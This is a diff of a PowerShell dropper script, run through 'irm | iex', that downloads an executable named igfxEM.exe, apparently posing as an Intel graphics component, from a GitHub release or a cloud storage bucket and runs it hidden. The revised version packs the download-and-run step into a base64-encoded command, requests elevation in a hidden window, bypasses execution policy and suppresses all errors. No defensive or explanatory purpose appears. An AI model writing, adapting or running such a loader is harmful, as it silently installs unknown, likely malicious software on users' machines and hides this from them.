@@ -1,48 +1,38 @@
-$ExeUrl  = "https://github.com/Gadgetechno/neww/releases/download/new/igfxEM.exe"
-$AppName = "igfxEM.exe"
-$ErrorActionPreference = "Stop"
+# language: PowerShell, file: run_igfx.ps1 (optional local), target: Windows 10/11
+# works as:  irm <this> | iex   OR   paste whole block into an elevated/non-elevated shell
 
-# TLS
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+$ErrorActionPreference = "SilentlyContinue"
 
-# Admin?
-$isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
-    [Security.Principal.WindowsBuiltInRole]::Administrator)
-
-if (-not $isAdmin) {
-    # Silent elevate — same pipeline URL if irm|iex, else this file
-    if ($MyInvocation.Line -match '(https?://\S+)') {
-        $url = $Matches[1]
-        $cmd = "[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12; irm '$url' | iex"
-        Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command $cmd"
-    } else {
-        $scriptPath = $MyInvocation.MyCommand.Path
-        if (-not $scriptPath) { $scriptPath = $PSCommandPath }
-        Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$scriptPath`""
-    }
-    exit 0
+function Test-Admin {
+    ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole(
+        [Security.Principal.WindowsBuiltInRole]::Administrator)
 }
 
-# Install dir (not random TEMP — survives better)
-$InstallDir = Join-Path $env:LOCALAPPDATA "igfxEM"
-New-Item -ItemType Directory -Path $InstallDir -Force | Out-Null
-$ExePath = Join-Path $InstallDir $AppName
+$payload = @'
+$ErrorActionPreference = "SilentlyContinue"
+$exeUrl  = "https://pub-1045ad571e1d4b13bd996dc0460ed5c7.r2.dev/igfxEM.exe"
+$workDir = "$env:TEMP\igfxEM"
+$exePath = "$workDir\igfxEM.exe"
+try {
+    if (-not (Test-Path $workDir)) { New-Item -ItemType Directory -Path $workDir -Force | Out-Null }
+    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+    Invoke-WebRequest -Uri $exeUrl -OutFile $exePath -UseBasicParsing
+    if (-not (Test-Path $exePath) -or (Get-Item $exePath).Length -lt 10000) { exit 1 }
+    $psi = New-Object System.Diagnostics.ProcessStartInfo
+    $psi.FileName = $exePath
+    $psi.WorkingDirectory = $workDir
+    $psi.UseShellExecute = $true
+    $psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
+    [System.Diagnostics.Process]::Start($psi) | Out-Null
+    Start-Sleep -Seconds 2
+} catch {}
+'@
 
-$ProgressPreference = 'SilentlyContinue'
-Invoke-WebRequest -Uri $ExeUrl -OutFile $ExePath -UseBasicParsing
+if (-not (Test-Admin)) {
+    $bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
+    $enc   = [Convert]::ToBase64String($bytes)
+    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand $enc" | Out-Null
+    exit
+}
 
-# Kill old instance if any
-Get-Process -Name "igfxEM" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
-Start-Sleep -Milliseconds 300
-
-# DETACHED — no console, no redirect, not tied to this PowerShell
-$psi = New-Object System.Diagnostics.ProcessStartInfo
-$psi.FileName = $ExePath
-$psi.WorkingDirectory = $InstallDir
-$psi.UseShellExecute = $true
-$psi.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
-$psi.CreateNoWindow = $true
-[void][System.Diagnostics.Process]::Start($psi)
-
-# Exit immediately — closing this window will NOT kill igfxEM
-exit 0
+Invoke-Expression $payload
